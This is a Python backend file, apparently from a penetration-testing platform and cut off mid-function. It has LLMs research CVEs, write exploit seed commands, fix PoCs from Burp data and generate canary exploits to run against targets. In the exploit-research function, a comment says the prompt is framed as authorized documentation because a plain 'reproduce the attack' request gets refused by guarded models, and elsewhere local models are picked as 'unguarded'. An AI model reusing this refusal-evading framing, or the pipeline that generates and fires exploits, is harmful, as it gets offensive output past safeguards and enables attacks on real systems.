    """Pull VENDOR documentation to validate specific readiness questions that
    can't be answered from what's already in hand — instead of assuming.

    Operator ask: "the challenge skill should look at everything and not allow
    assumptions, pull vendor docs to validate if required."

    For each question (e.g. "is version X in the affected range?", "what
    permission does script execution require?", "what is the exact login
    endpoint + fields?") this searches the vendor's official docs / security
    page / release notes, fetches the top hits (Jira-aware), and asks the LLM
    to ANSWER WITH A CITATION or say UNKNOWN — never guess.

    Returns {answers: [{question, verdict, evidence, source}], unresolved: [...]}.
    """
    if not product or not questions:
        return {"answers": [], "unresolved": list(questions or [])}
    pv = f"{product} {version}" if version else product
    # Cache by (product, version, cve) — vendor docs don't change build-to-
    # build, so the expensive DDG+fetch+LLM pass runs ONCE per target then
    # serves instantly (rigor without a 4-minute gate every run).
    _ck = f"vendor_doc_validation:{(product or '').lower()}:{version or ''}:{cve or ''}"
    try:
        _cached = _get_setting(_ck, "")
        if _cached:
            import json as _cj
            return _cj.loads(_cached)
    except Exception:  # noqa: BLE001
        pass
    # Bounded to 2 queries (the CVE affected-versions query is highest value)
    # so the gate stays fast.
    queries = [f"{product} {cve} affected versions" if cve else f"{pv} security advisory",
               f"{pv} documentation"]
    seen, docs = set(), []
    for q in queries:
        try:
            for r in (ddg_search(q, max_results=4, timeout=6) or []):
                url = (r.get("url") or "").strip()
                if not url or url in seen:
                    continue
                seen.add(url)
                # Prefer official-looking docs/vendor domains.
                low = url.lower()
                weight = 0
                if any(s in low for s in ("docs.", "/docs/", "documentation",
                                           "/manual", "support.", "/security",
                                           "release-notes", "changelog", "wiki")):
                    weight += 3
                prod_tok = (product.split()[0].lower() if product else "")
                if prod_tok and prod_tok in low:
                    weight += 2
                if weight > 0:
                    r["_w"] = weight
                    docs.append(r)
        except Exception:  # noqa: BLE001
            pass
    docs.sort(key=lambda x: -x.get("_w", 0))
    corpus = []
    for r in docs[:max_pages]:
        body = _fetch_advisory_text(r["url"], timeout=8, max_bytes=5000)
        if body:
            corpus.append(f"--- {r.get('title','')[:100]}\nURL: {r['url']}\n{body[:4000]}")
    corpus_text = "\n\n".join(corpus)
    if not corpus_text:
        return {"answers": [], "unresolved": list(questions)}
    qlist = "\n".join(f"{i+1}. {q}" for i, q in enumerate(questions))
    prompt = (
        f"You are validating readiness facts for an AUTHORIZED pentest of "
        f"{pv}. Answer EACH question ONLY from the vendor documentation below. "
        f"Do NOT guess — if the docs don't answer it, say verdict 'unknown'. "
        f"No assumptions.\n\nVENDOR DOCS:\n{corpus_text[:12000]}\n\n"
        f"QUESTIONS:\n{qlist}\n\n"
        'Return JSON only: {"answers": [{"n": <num>, "verdict": '
        '"yes"|"no"|"unknown", "evidence": "<quote/paraphrase from docs>", '
        '"source": "<url>"}]}')
    answers, unresolved = [], []
    try:
        res = _llm_for_model(prompt, model=model, caller="vendor_doc_validation",
                             num_predict=600)
        txt = res.get("response", "") if isinstance(res, dict) else str(res or "")
        obj = _poc_extract_json(txt) or {}
        for ans in (obj.get("answers") or []):
            n = ans.get("n")
            q = questions[n - 1] if isinstance(n, int) and 1 <= n <= len(questions) else ""
            if ans.get("verdict") == "unknown":
                unresolved.append(q or str(ans))
            answers.append({"question": q, "verdict": ans.get("verdict"),
                            "evidence": ans.get("evidence", ""),
                            "source": ans.get("source", "")})
    except Exception as e:  # noqa: BLE001
        logging.debug("vendor doc validation failed: %s", e)
        unresolved = list(questions)
    out = {"answers": answers, "unresolved": unresolved}
    # Cache the result so repeat builds for this (product, version, cve) are
    # instant — cache even an empty answer set (the scrape ran and found
    # nothing usable; re-running it on the next iter won't help and costs
    # ~50s). A later manual cache-clear or a new product/version re-runs it.
    if True:
        try:
            import json as _cj
            with get_db() as _c, _c.cursor() as _cur:
                _cur.execute(
                    "INSERT INTO app_settings (key, value, category) "
                    "VALUES (%s,%s,'vendor_doc_cache') "
                    "ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value",
                    (_ck, _cj.dumps(out)))
                _c.commit()
        except Exception:  # noqa: BLE001
            pass
    return out


def _assess_exploit_readiness(ip, port, analysis, session_info=None,
                               precond_result=None, product=None, model=None,
                               version=None, cve=None, validate_vendor_docs=True,
                               advisory_text=None, llm_challenge=None,
                               access_inventory=None):
    """CHALLENGE SKILL — before the build loop hammers iterations, review every
    precondition and judge whether all the pieces are actually in hand.

    Operator ask: "we need a challenge skill to review and check for
    preconditions to ensure that all of the pieces are available before
    hammering away on incomplete data."

    Combines:
      - deterministic checks: auth/session validity (real probe, not just
        "a cookie exists"), object-ids resolved by the enumeration step,
        target reachability.
      - an LLM 'challenge' review of the advisory preconditions vs what we
        actually have — a second opinion that catches gaps the deterministic
        rules don't model.

    Returns {ready: bool, blockers: [...], satisfied: [...], score: 0..1,
             llm_verdict: str}. A HARD blocker (auth-required exploit with a
             dead session) sets ready=False so the gate can short-circuit
             instead of wasting 30 iters on data that can't work.
    """
    a = analysis or {}
    preconds = [str(p) for p in (a.get("preconditions") or [])]
    pre_blob = (" ".join(preconds) + " " + str(a.get("summary", ""))).lower()
    si = session_info or {}
    pr = precond_result or {}
    blockers, satisfied = [], []

    needs_auth = any(k in pre_blob for k in
                     ("auth", "login", "session", "logged", "credential", "cookie",
                      "privilege", "user ", "account"))
    cookie = si.get("cookie_header") if isinstance(si, dict) else None

    # 1. AUTH/SESSION — the #1 silent killer. If the exploit needs auth,
    #    confirm the session is REALLY valid (probe), not just present.
    if needs_auth:
        if not cookie:
            blockers.append("exploit requires authentication but NO session "
                            "cookie was established")
        else:
            valid, why = _probe_session_valid(ip, port, cookie, product=product)
            if valid:
                satisfied.append(f"authenticated session is valid ({why})")
            else:
                blockers.append(f"authenticated session is NOT valid — {why}. "
                                "Fix the login flow before attempting the "
                                "exploit (it needs a live session).")

    # 2. OBJECT-ID preconditions — resolved by the enumeration step?
    resolved = pr.get("resolved") or {}
    for unmet in (pr.get("unmet") or []):
        blockers.append(unmet)
    for conf in (pr.get("confirmed") or []):
        satisfied.append(conf)
    # Detect id-shaped preconditions the enumeration didn't resolve.
    for idkind in ("hostid", "userid", "groupid", "itemid", "templateid"):
        if idkind in pre_blob and idkind not in resolved and not any(idkind in u for u in (pr.get("unmet") or [])):
            blockers.append(f"exploit references {idkind} but none was enumerated "
                            "from the target — value would be guessed")

    # 2b. LOGIN INVENTORY — operator: "gather all information from any logins
    #     before moving on." If we HAVE a live session, the full post-access
    #     inventory MUST have been gathered; a blank inventory on a live login
    #     means we moved on without enumerating what the access exposed — the
    #     exact gap that let a build hammer a target without its hostid.
    _inv = access_inventory or {}
    _inv_objs = sum(len(v or []) for v in _inv.values()) if isinstance(_inv, dict) else 0
    if cookie:  # a session is in hand
        if _inv_objs:
            _kinds = ", ".join(f"{k}={len(v or [])}" for k, v in _inv.items() if v)
            satisfied.append(f"post-access inventory gathered from the login "
                             f"({_inv_objs} object(s): {_kinds})")
        elif needs_auth:
            blockers.append("a login/session is in hand but NO post-access "
                            "inventory was gathered — enumerate everything the "
                            "access exposes (hosts, scripts, users, objects) "
                            "BEFORE attempting the exploit; moving on without it "
                            "means prerequisite ids would be guessed")

    # 3. TARGET reachability (cheap sanity).
    import httpx as _hx
    scheme = "https" if int(port or 80) in (443, 8443) else "http"
    base = f"{scheme}://{ip}:{port or 80}"
    try:
        with _hx.Client(verify=False, timeout=6) as cli:
            r = cli.get(f"{base}/")
            satisfied.append(f"target reachable (HTTP {r.status_code})")
    except Exception:  # noqa: BLE001
        blockers.append("target did not respond to a basic HTTP probe")

    # 4. ENDPOINT EXISTENCE — don't ASSUME the vulnerable endpoint is there.
    #    Probe the advisory-named target_endpoint; a 404 means the exploit
    #    aims at a path this install doesn't expose (wrong version, disabled
    #    feature, different router).
    tep = (a.get("target_endpoint") or "").strip()
    if tep and "{" in tep:
        blockers.append(f"advisory endpoint {tep} has an unresolved placeholder "
                        f"{_path_placeholders(tep)} — enumerate the id before it can be probed")
    elif tep and tep.startswith("/"):
        try:
            with _hx.Client(verify=False, timeout=6, follow_redirects=True,
                             headers={"Cookie": cookie} if cookie else {}) as cli:
                er = cli.get(base + tep)
                if er.status_code == 404:
                    blockers.append(f"advisory endpoint {tep} returns 404 — not "
                                    "present on this target (wrong version / "
                                    "feature disabled / different router path)")
                else:
                    satisfied.append(f"endpoint {tep} exists (HTTP {er.status_code})")
        except Exception:  # noqa: BLE001
            pass

    # 5. VERSION APPLICABILITY — confirm the detected version is actually in
    #    the affected range, from the advisory text we already gathered. Not
    #    confirmable there → defer to the vendor-doc validation below.
    version_unconfirmed = bool(version)
    if version:
        # Reuse the advisory the build already gathered (research_out) — don't
        # re-fetch GHSA/Jira/DDG here (that was making the gate a ~minute step).
        adv = advisory_text or ""
        if not adv and cve and validate_vendor_docs:
            # Only pay for a fresh gather in strict mode (vendor validation on).
            try:
                intel = _gather_cve_intel(cve, product=product, version=version,
                                          include_msf_edb=False)
                adv = intel.get("advisory_text") or "" if isinstance(intel, dict) else ""
            except Exception:  # noqa: BLE001
                adv = ""
        if adv and version in adv:
            satisfied.append(f"version {version} appears in the advisory text")
            version_unconfirmed = False

    # 6. VENDOR-DOC VALIDATION — for anything we could NOT confirm, pull vendor
    #    docs and validate rather than assume. No assumptions is the rule.
    vendor = {"answers": [], "unresolved": []}
    if validate_vendor_docs and product:
        vq = []
        if version_unconfirmed and version:
            vq.append(f"Is {product} version {version} affected by {cve}? "
                      "What is the exact affected version range?")
        # Ask the docs to pin any precondition prose into a concrete requirement.
        for p in preconds[:3]:
            vq.append(f"For {cve} on {product}, validate this precondition and "
                      f"state the concrete requirement: {p}")
        if vq:
            try:
                vendor = _validate_against_vendor_docs(
                    product, version, vq, cve=cve, model=model)
                for ans in vendor.get("answers", []):
                    if ans.get("verdict") == "yes" and ans.get("evidence"):
                        satisfied.append(f"vendor-doc confirmed: {ans['evidence'][:140]}")
                    elif ans.get("verdict") == "no":
                        blockers.append(f"vendor-doc CONTRADICTS a requirement: "
                                        f"{ans.get('question','')[:80]} — {ans.get('evidence','')[:120]}")
                # Unresolved questions are NOT assumed satisfied — they're gaps.
                for u in vendor.get("unresolved", []):
                    blockers.append(f"UNVERIFIED (vendor docs silent, not assumed met): {u[:120]}")
            except Exception as e:  # noqa: BLE001
                logging.debug("vendor validation in readiness failed: %s", e)

    # 4. LLM challenge review — a second opinion. Opt-in (strict mode / explicit
    #    llm_challenge=True) since it adds an LLM round-trip; the deterministic
    #    checks already enforce "no assumptions".
    want_llm = llm_challenge if llm_challenge is not None else validate_vendor_docs
    llm_verdict = ""
    if want_llm and preconds and _poc_semantic_verify_enabled():
        try:
            prompt = (
                "You are a STRICT readiness reviewer for an AUTHORIZED pentest "
                "PoC. RULE: allow NO assumptions. Every precondition is either "
                "CONFIRMED by concrete evidence below, or it is MISSING — there "
                "is no 'probably fine'. If a precondition is not explicitly "
                "backed by the confirmed-evidence list, it is MISSING. Do NOT "
                "write an exploit — only judge readiness.\n"
                f"Exploit preconditions (from the advisory):\n- "
                + "\n- ".join(preconds) + "\n\n"
                f"CONFIRMED by evidence (probes / vendor docs / enumeration):\n- "
                + ("\n- ".join(satisfied) or "(nothing)") + "\n\n"
                f"Known gaps:\n- " + ("\n- ".join(blockers) or "(none)") + "\n\n"
                'Return JSON only: {"ready": true/false, "missing": ["every '
                'precondition NOT backed by confirmed evidence"], '
                '"reason": "<one sentence>"}')
            res = _llm_for_model(prompt, model=model, caller="exploit_readiness_challenge",
                                 num_predict=256)
            txt = res.get("response", "") if isinstance(res, dict) else str(res or "")
            obj = _poc_extract_json(txt) or {}
            llm_verdict = obj.get("reason", "")
            for m in (obj.get("missing") or []):
                if m and m not in blockers:
                    blockers.append(f"(LLM) {m}")
        except Exception as e:  # noqa: BLE001
            logging.debug("readiness LLM challenge failed: %s", e)

    hard_blocked = any("NOT valid" in b or "NO session" in b
                       or "did not respond" in b for b in blockers)
    total = len(blockers) + len(satisfied)
    score = round(len(satisfied) / total, 2) if total else 0.0
    ready = (not hard_blocked) and (len(blockers) == 0 or not needs_auth and score >= 0.5)
    # PERSIST every verdict to the confirmed-facts ledger so a confirmation is
    # never lost — reused across iterations/builds, with evidence + freshness.
    # satisfied → confirmed; blocker → refuted (hard) / unverified (soft).
    tgt = f"{ip}:{port or 80}"
    # Scope rule: TARGET-level facts (session validity, a resolved hostid, an
    # endpoint's existence, reachability, the running version) are properties
    # of the TARGET/user — NOT of this CVE — so they're stored cve=NULL and
    # ANY other attack against the same target reuses them. Only CVE-specific
    # judgements (does version X have THIS cve, this cve's preconditions,
    # vendor-doc answers for this cve) are scoped to the cve.
    TARGET_LEVEL = {"session_valid", "target_reachable", "endpoint_exists", "object_id"}
    try:
        for s in satisfied:
            ct, ck = "precondition", s[:60]
            low = s.lower()
            if "session is valid" in low: ct, ck = "session_valid", "auth"
            elif "target reachable" in low: ct, ck = "target_reachable", "/"
            elif "endpoint" in low and "exists" in low: ct, ck = "endpoint_exists", (a.get("target_endpoint") or "/")
            elif "version" in low and "advisory" in low: ct, ck = "version_applies", (version or "")
            elif "vendor-doc confirmed" in low: ct, ck = "vendor_doc", s[:60]
            _cve = None if ct in TARGET_LEVEL else cve
            _record_confirmation(tgt, ct, ck, "confirmed", evidence=s,
                                 method="probe", product=product, version=version,
                                 cve=_cve, engagement_id=None, run_id=None)
            # A confirmed valid session → register as a foothold on the asset.
            if ct == "session_valid":
                _uname = (si.get("username") if isinstance(si, dict) else None)
                _register_web_session_access(ip, port, _uname, cookie,
                                             product=product, engagement_id=None)
        # Resolved object-ids: durable, concrete, TARGET-level (cve=NULL) so a
        # hostid confirmed for one CVE is usable by every other attack.
        for k, vals in (resolved or {}).items():
            for v in (vals or [])[:5]:
                _record_confirmation(tgt, "object_id", k, "confirmed",
                                     evidence=f"enumerated {k}={v}",
                                     method="enumeration", claim_value=str(v),
                                     product=product, version=version, cve=None)
        for b in blockers:
            st = "refuted" if ("NOT valid" in b or "NO session" in b
                               or "404" in b or "CONTRADICTS" in b
                               or "did not respond" in b) else "unverified"
            # A refuted session/reachability is target-level; refuted
            # preconditions are cve-specific.
            _bt = "session_valid" if ("NOT valid" in b or "NO session" in b) else "precondition"
            _bcve = None if _bt in TARGET_LEVEL else cve
            _record_confirmation(tgt, _bt, b[:60] if _bt == "precondition" else "auth",
                                 st, evidence=b, method="probe",
                                 product=product, version=version, cve=_bcve)
    except Exception as e:  # noqa: BLE001
        logging.debug("persist confirmations failed: %s", e)
    return {"ready": ready, "hard_blocked": hard_blocked,
            "blockers": blockers, "satisfied": satisfied,
            "score": score, "llm_verdict": llm_verdict}


def _gather_cve_intel(cve, product=None, version=None, ip=None, port=None,
                       include_msf_edb=True):
    """SHARED CVE-intel engine — the single source both the build-poc research
    path (_research_exploit) and the operator deep-dive (cve_deep_search) draw
    from, so a fix to intel gathering lands in BOTH automatically.

    Gathers, in priority order:
      1. Structured advisory APIs — GitHub GHSA (+ its referenced patch
         commits + vendor Jira tickets via REST) + CIRCL + Nuclei templates.
      2. DDG-scraped advisory / patch-commit / vendor-changelog pages
         (Jira-aware fetch).
      3. (optional) Metasploit module search + ExploitDB PoC text + NVD
         description — the build path wants these; the applicability check
         doesn't need them.

    Returns {cve, nvd, msf, edb, poc_text, advisory_text, combined} where
    `combined` is the single prompt-ready text block.
    """
    import requests as _rq
    cve = (cve or "").strip().upper()
    nvd = {}
    msf, edb, poc_text = [], [], ""
    if include_msf_edb:
        er = EXPLOIT_RUNNER_URL.rstrip("/")
        hdr = {"x-api-key": API_KEY}
        try:
            r = _rq.get(f"{er}/msf/search", params={"cve": cve, "limit": 3},
                        headers=hdr, verify=False, timeout=45)
            msf = (r.json() or {}).get("results") or [] if r.ok else []
        except Exception:  # noqa: BLE001
            pass
        try:
            r = _rq.get(f"{er}/exploitdb/search",
                        params={"cve": cve, "limit": 3, "with_poc": "true"},
                        headers=hdr, verify=False, timeout=60)
            edb = (r.json() or {}).get("results") or [] if r.ok else []
        except Exception:  # noqa: BLE001
            pass
        nvd = _fetch_cve_details(cve) or {}
        for e in edb:
            if e.get("poc"):
                poc_text += f"\n--- EDB-{e.get('edb_id')}: {e.get('title', '')} ---\n{str(e['poc'])[:4000]}\n"
    # Advisory + patch + changelog — ALWAYS (the highest-value vector source).
    advisory_text = ""
    try:
        advisory_text = _research_cve_advisories(
            cve, max_results=4, per_url_bytes=6000, product=product, version=version)
    except Exception:  # noqa: BLE001
        advisory_text = ""
    msf_text = "\n".join(f"- MSF module {m.get('module')} (rank {m.get('rank')})" for m in msf)
    combined_parts = []
    if nvd.get("description"):
        combined_parts.append(f"CVE description: {nvd['description']}")
    if msf_text:
        combined_parts.append(f"Metasploit module(s):\n{msf_text}")
    if poc_text:
        combined_parts.append(f"Public reference (ExploitDB):{poc_text}")
    if advisory_text:
        combined_parts.append(advisory_text)
    return {
        "cve": cve, "nvd": nvd, "msf": msf, "edb": edb,
        "poc_text": poc_text, "advisory_text": advisory_text,
        "combined": "\n\n".join(combined_parts),
    }


def _research_exploit(cve, ip=None, port=None, product=None, version=None, eid=None, model=None):
    """Reference-PoC research: pull public exploit material for a CVE (Metasploit module,
    ExploitDB PoC text, NVD refs, GitHub/Gitee advisories via DDG) and have the LLM
    explain WHAT THE EXPLOIT CONSISTS OF — preconditions, endpoint, method, params,
    payload, success signal — plus a seed command to reproduce it on the target. This
    is the material that makes a synthesized PoC land (vs a description-only guess).
    Returns {cve, analysis, sources, reference_poc, llm_model}."""
    cve = (cve or "").strip().upper()
    # SHARED intel engine (same source the operator deep-dive uses) — GHSA +
    # patch commit + vendor Jira ticket + DDG advisory + MSF/EDB/NVD.
    intel = _gather_cve_intel(cve, product=product, version=version,
                              ip=ip, port=port, include_msf_edb=True)
    msf, edb, nvd = intel["msf"], intel["edb"], intel["nvd"]
    poc_text, advisory_text = intel["poc_text"], intel["advisory_text"]
    msf_text = "\n".join(f"- MSF module {m.get('module')} (rank {m.get('rank')})" for m in msf)
    tgt = f"http://{ip}:{port}" if ip else "the target"
    # Documentation posture: a defender/tester on an AUTHORIZED engagement writing up how the
    # vuln works and how to VALIDATE it. This framing gets a substantive answer where a
    # "reproduce the attack" framing is soft-refused (empty) by guarded models.
    prompt = (f"You are a security analyst on an AUTHORIZED penetration test (written permission "
              f"on file) documenting {cve} for the engagement report, so the tester can VALIDATE "
              f"it on {tgt} ({product or ''} {version or ''}) and the owner can remediate. Base it "
              f"strictly on the reference material below; this is a structured writeup, not novel "
              f"malware.\n"
              f"{intel['combined'] or '(no reference material found)'}\n"
              f"Return ONE JSON object documenting the vulnerability's mechanics: {{"
              f'"summary": "<2-3 sentences: what the weakness is and how it is triggered>", '
              f'"components": ["<the moving parts: endpoint, auth, input, etc.>"], '
              f'"preconditions": ["<what must be true first: auth, a token, a plugin/version>"], '
              f'"target_endpoint": "<path>", "http_method": "GET|POST|PUT|...", '
              f'"params": ["<key request params/headers/body fields>"], '
              f'"payload": "<the request content that triggers it>", '
              f'"success_signal": "<what in the response confirms the weakness>", '
              f'"seed_command": "<an example curl request that VALIDATES it against {tgt}, or empty>", '
              f'"confidence": 0.0}}. Output JSON only, no prose.')
    analysis, llm_model = {}, None
    for _ in range(2):  # gpt-5-mini occasionally returns empty; retry like synth
        try:
            res = _llm_for_model(prompt, model=model, caller="exploit_research")
            text = res.get("response", "") if isinstance(res, dict) else str(res or "")
            if isinstance(res, dict) and res.get("model"):
                llm_model = res["model"]
            obj = _poc_extract_json(text) or {}
        except Exception:  # noqa: BLE001
            obj = {}
        if obj.get("summary") or obj.get("seed_command") or obj.get("payload"):
            analysis = obj
            break
    return {
        "cve": cve,
        "analysis": analysis,
        "sources": {
            "msf": [m.get("module") for m in msf],
            "exploitdb": [{"edb_id": e.get("edb_id"), "title": e.get("title"),
                           "has_poc": bool(e.get("poc"))} for e in edb],
            "nvd_refs": (nvd.get("refs") or [])[:8],
            "has_public_module": bool(msf or edb),
            "has_advisory_text": bool(advisory_text),
        },
        "reference_poc": poc_text[:8000],
        "advisory_text": advisory_text[:12000],
        "llm_model": llm_model,
    }


class ResearchExploitBody(BaseModel):
    cve: str
    ip: Optional[str] = None
    port: Optional[int] = None
    product: Optional[str] = None
    version: Optional[str] = None
    model: Optional[str] = None


@app.get("/exploit-store/meta/models", tags=["Exploit Store"])
def list_exploit_models(authorized: bool = Depends(auth)):
    """Models available for research/synth/bake-off: local ollama models (run locally,
    private, unguarded) + the cloud default (routed). Used by the model picker/bake-off.
    (Path is /meta/models to avoid shadowing by /exploit-store/{id}.)"""
    local = _ollama_tags()
    return {"local": local, "cloud_default": "routed (llm_query task routing)",
            "has_local": bool(local)}


@app.post("/exploit-store/research", tags=["Exploit Store"])
def research_exploit_endpoint(body: ResearchExploitBody, authorized: bool = Depends(auth)):
    """Runnable skill: research public exploit material for a CVE and break down WHAT THE
    EXPLOIT CONSISTS OF (MSF/ExploitDB/NVD -> LLM analysis + a seed command). Read-only
    (searches existing corpora; sends no traffic to the target). `model` may pick a local
    ollama model."""
    cve = (body.cve or "").strip().upper()
    if not cve.startswith("CVE-"):
        raise HTTPException(400, "cve must be a CVE id")
    out = _research_exploit(cve, body.ip, body.port, body.product, body.version, model=body.model)
    try:
        emit_webhook("exploit_research_run", "exploit_store",
                     {"cve": cve, "target": body.ip,
                      "has_public_module": out["sources"]["has_public_module"],
                      "seed": bool((out.get("analysis") or {}).get("seed_command"))})
    except Exception:  # noqa: BLE001
        pass
    return {"ok": True, **out}


@app.post("/exploit-store/{exploit_id}/research", tags=["Exploit Store"])
def research_for_exploit(exploit_id: str, seed: bool = False, authorized: bool = Depends(auth)):
    """Research the reference PoC for a stored exploit's CVE. With seed=true, seed the
    entry's command from the analysis (auto-snapshotting the prior state as a version) and
    store the analysis under metadata.research so the tester can see what it consists of."""
    _ensure_exploit_store()
    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
        cur.execute("SELECT * FROM exploit_store WHERE id = %s", (exploit_id,))
        row = cur.fetchone()
        if not row:
            raise HTTPException(404, "exploit not found")
    if not row["cve"]:
        raise HTTPException(400, "entry has no CVE to research")
    out = _research_exploit(row["cve"], row["target_host"], row["target_port"],
                            row["product"], row["version"], row["engagement_id"])
    analysis = out.get("analysis") or {}
    seeded = False
    if seed and analysis.get("seed_command"):
        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
            cur.execute("SELECT * FROM exploit_store WHERE id = %s", (exploit_id,))
            cur_row = cur.fetchone()
            try:
                _snapshot_exploit_version(cur, dict(cur_row), label="auto (pre-research-seed)")
            except Exception as e:  # noqa: BLE001
                logging.debug("pre-seed snapshot failed: %s", e)
            new_cmd = str(analysis["seed_command"])
            art = _exploit_store_artifacts(cur_row["kind"], new_cmd, cur_row["name"],
                                           cur_row["cve"], analysis.get("summary"), cur_row["assertion"])
            md = dict(cur_row["metadata"] or {}); md["research"] = analysis
            cur.execute("""UPDATE exploit_store SET command=%s, python_code=%s, http_request=%s,
                           rationale=COALESCE(NULLIF(%s,''), rationale), metadata=%s, updated_at=now()
                           WHERE id=%s""",
                        (new_cmd, art["python_code"], art["http_request"],
                         analysis.get("summary") or "", Json(md), exploit_id))
            conn.commit()
        seeded = True
    else:
        # store the analysis for reference even when not seeding the command
        with get_db() as conn, conn.cursor() as cur:
            cur.execute("""UPDATE exploit_store
                           SET metadata = jsonb_set(COALESCE(metadata,'{}'::jsonb), '{research}', %s::jsonb),
                               updated_at = now() WHERE id = %s""",
                        (json.dumps(analysis, default=str), exploit_id))
            conn.commit()
    try:
        emit_webhook("exploit_research_run", "exploit_store",
                     {"id": exploit_id, "cve": row["cve"], "seeded": seeded,
                      "has_public_module": out["sources"]["has_public_module"]})
    except Exception:  # noqa: BLE001
        pass
    return {"ok": True, "seeded": seeded, **out}


class TweakWithBurpBody(BaseModel):
    """Operator-driven tweak loop: the tester has been poking the target in
    Burp Repeater and wants Claude to pull Burp context + the current PoC and
    suggest a corrected command. All fields optional — endpoint fills in from
    the exploit_store row + the discovered_params / web_findings tables when
    the operator doesn't paste anything explicit."""
    tweaked_request: Optional[str] = None   # raw HTTP from Repeater (operator's current attempt)
    failure_output: Optional[str] = None    # last run output / Burp response body
    operator_note: Optional[str] = None     # what the tester tried / wants
    include_sitemap: bool = True            # pull discovered_params + web_findings for this host
    model: Optional[str] = None


@app.post("/exploit-store/{exploit_id}/tweak-with-burp", tags=["Exploit Store"])
def tweak_with_burp(exploit_id: str, body: TweakWithBurpBody, authorized: bool = Depends(auth)):
    """LLM-assisted tweak loop. The tester has been manually tweaking the PoC
    in Burp Repeater (or watching an active scan land issues). This endpoint
    pulls:
      - the current stored PoC (command, http_request, assertion, metadata),
      - Burp context: discovered_params + web_findings for the target host,
      - the tester's tweaked request + failure output + free-text note,
    assembles a focused prompt, and asks the configured LLM to suggest a
    corrected command + updated assertion + rationale. Read-only — operator
    reviews, then clicks Apply (which snapshots the current state and writes
    the suggested command, same as the research-seed path).

    This is the natural companion to the Burp assist panel: send to Repeater,
    tweak manually, ask Claude to fix. Nothing dispatches here."""
    _ensure_exploit_store()
    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
        cur.execute("SELECT * FROM exploit_store WHERE id = %s", (exploit_id,))
        row = cur.fetchone()
        if not row:
            raise HTTPException(404, "exploit not found")
        host = row.get("target_host") or ""
        # Pull Burp context for this host — discovered_params (what Burp +
        # arjun + katana have found) + the last 10 web_findings. Both carry
        # the actual URLs/params Burp observed, which is the signal Claude
        # needs to suggest a different parameter name or endpoint path.
        discovered: list = []
        findings: list = []
        if body.include_sitemap and host:
            try:
                cur.execute("""
                    SELECT url, http_method, param_name, param_location, source
                    FROM discovered_params dp
                    WHERE url ILIKE %s OR host = %s
                    ORDER BY first_seen DESC NULLS LAST
                    LIMIT 50
                """, (f"%{host}%", host))
                discovered = [dict(r) for r in cur.fetchall()]
            except Exception as e:  # noqa: BLE001
                logging.debug("discovered_params lookup failed: %s", e)
            try:
                cur.execute("""
                    SELECT url, name, severity, evidence, method
                    FROM web_findings
                    WHERE url ILIKE %s
                    ORDER BY last_seen DESC NULLS LAST
                    LIMIT 10
                """, (f"%{host}%",))
                findings = [dict(r) for r in cur.fetchall()]
            except Exception as e:  # noqa: BLE001
                logging.debug("web_findings lookup failed: %s", e)
    # Compose the prompt. Keep it structured so the model's JSON reply is
    # parseable (same shape convention as research_exploit).
    import json as _json
    ctx = {
        "cve": row.get("cve"),
        "product": row.get("product"), "version": row.get("version"),
        "target": f"{host}:{row.get('target_port') or ''}".strip(":"),
        "current_command": row.get("command") or "",
        "current_http_request": (row.get("http_request") or "")[:4000],
        "current_assertion": row.get("assertion") or {},
        "tester_tweaked_request": (body.tweaked_request or "")[:4000],
        "last_failure_output": (body.failure_output or "")[:4000],
        "tester_note": body.operator_note or "",
        "burp_discovered_params": discovered[:30],
        "burp_web_findings": findings[:10],
    }
    prompt = (
        "You are helping a pentester fix a stored PoC. The tester has been "
        "manually tweaking the request in Burp Repeater and has shared the "
        "current state + what Burp has observed on this host. Your job is to "
        "suggest a CORRECTED shell command (curl/python/etc.) that would make "
        "the PoC succeed, plus an updated assertion that proves success. Do "
        "NOT execute anything — just suggest.\n\n"
        f"Context (JSON):\n{_json.dumps(ctx, default=str, indent=2)}\n\n"
        "Reply with STRICT JSON only, no prose:\n"
        '{\n'
        '  "suggested_command": "<the full new shell command>",\n'
        '  "suggested_assertion": {<same shape as current_assertion>},\n'
        '  "rationale": "<2-4 sentences on what changed and why>",\n'
        '  "burp_context_used": ["<which discovered_params/findings informed the fix>", ...]\n'
        '}\n'
    )
    res = _llm_for_model(prompt, model=body.model, caller="exploit_tweak_with_burp",
                         num_predict=1200, temperature=0.2)
    suggestion: dict = {}
    try:
        text = res.get("response") or ""
        # Strip code fences if the model wrapped it
        import re as _re
        text = _re.sub(r"^```(?:json)?\s*|\s*```\s*$", "", text.strip(), flags=_re.MULTILINE)
        suggestion = _json.loads(text) if text else {}
    except Exception as e:  # noqa: BLE001
        logging.debug("tweak LLM reply parse failed: %s", e)
    try:
        emit_webhook("exploit_tweak_with_burp", "exploit_store", {
            "id": exploit_id, "cve": row.get("cve"), "target": ctx["target"],
            "has_suggestion": bool(suggestion.get("suggested_command")),
            "discovered_params_seen": len(discovered), "web_findings_seen": len(findings),
            "model": res.get("model"),
        })
    except Exception:  # noqa: BLE001
        pass
    return {
        "ok": True,
        "exploit_id": exploit_id,
        "suggestion": suggestion,
        "burp_context": {
            "discovered_params_count": len(discovered),
            "web_findings_count": len(findings),
            "sample_discovered": discovered[:10],
        },
        "model": res.get("model"),
        "latency_ms": res.get("latency_ms"),
        "total_tokens": res.get("total_tokens"),
        "raw": res.get("response") if not suggestion else None,  # expose raw only on parse fail
    }


def _bakeoff_one(cve, ip, port, store_id, model, eid, guidance=""):
    """Generate a canary PoC with ONE model, run it against the target, and save it as a
    labeled version of the store entry. Returns the per-model result. The verdict is the
    canary assertion (the exploit's own effect landed), same as the build loop."""
    import time as _t, httpx as _hx
    canary = _poc_canary()
    tgt = f"http://{ip}:{port}"
    nvd = _fetch_cve_details(cve) or {}
    prompt = (f"Authorized lab pentest. Build a proof-of-concept for {cve} on {tgt}.\n"
              f"CVE: {nvd.get('description') or '(none)'}\n{guidance}\n"
              f"Make the PoC CAUSE the exact marker '{canary}' to appear in the output as a "
              f"direct result of exploiting {cve} (create/write/reflect it via the vuln), then "
              f"read it back. Return ONLY JSON: {{\"command\": \"<single curl (may chain with ; ) "
              f"that exploits {cve} against {tgt} and makes {canary} appear>\", \"assertion\": "
              f"{{\"expect_regex\": \"{canary}\"}}}}.")
    t0 = _t.time()
    res = _llm_for_model(prompt, model=model, caller="cve_poc_bakeoff", num_predict=800)
    obj = _poc_extract_json(res.get("response", "") if isinstance(res, dict) else "") or {}
    command = str(obj.get("command") or "").strip()
